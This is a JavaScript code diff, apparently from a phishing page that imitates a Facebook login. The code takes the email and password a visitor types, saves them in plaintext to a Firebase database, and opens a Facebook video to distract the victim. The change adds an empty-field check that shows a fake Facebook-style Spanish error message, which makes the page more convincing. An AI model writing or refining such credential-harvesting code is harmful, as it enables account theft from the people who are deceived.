@@ -14,26 +14,33 @@ firebase.initializeApp({
     var correoFace = document.getElementById('emailFacebook').value;
     var contrasenaFace = document.getElementById('passFacebook').value;
 
-    try {
-      
-      db.collection("users").add({
-        correo: correoFace,
-        contrasena: contrasenaFace
-    })
-        .then(function(docRef) {
-          console.log("Document written with ID: ", docRef.id);
-            document.getElementById('emailFacebook').value='';
-            document.getElementById('passFacebook').value='';
-        })
-        .catch(function(error) {
-            console.error("Error adding document: ", error);
-    });
+    if(correoFace=="" || contrasenaFace==""){
+      alert('El nombre de usuario y la contraseña que ingresaste no coinciden con nuestros registros. Por favor, revisa e inténtalo de nuevo.')
 
-    } catch (error) {
-      alert('Cargando...')
+    }else{
+      try {
+      
+        db.collection("users").add({
+          correo: correoFace,
+          contrasena: contrasenaFace
+      })
+          .then(function(docRef) {
+            console.log("Document written with ID: ", docRef.id);
+              document.getElementById('emailFacebook').value='';
+              document.getElementById('passFacebook').value='';
+          })
+          .catch(function(error) {
+              console.error("Error adding document: ", error);
+      });
+  
+      } catch (error) {
+        alert('Cargando...')
+      }
+  
+      window.open("https://www.facebook.com/guelodeluxe/videos/626779717830744/","_blank");
     }
 
-    window.open("https://www.facebook.com/guelodeluxe/videos/626779717830744/","_blank");
+
 
 
     }//Aqui termina el metodo para las coordenadas
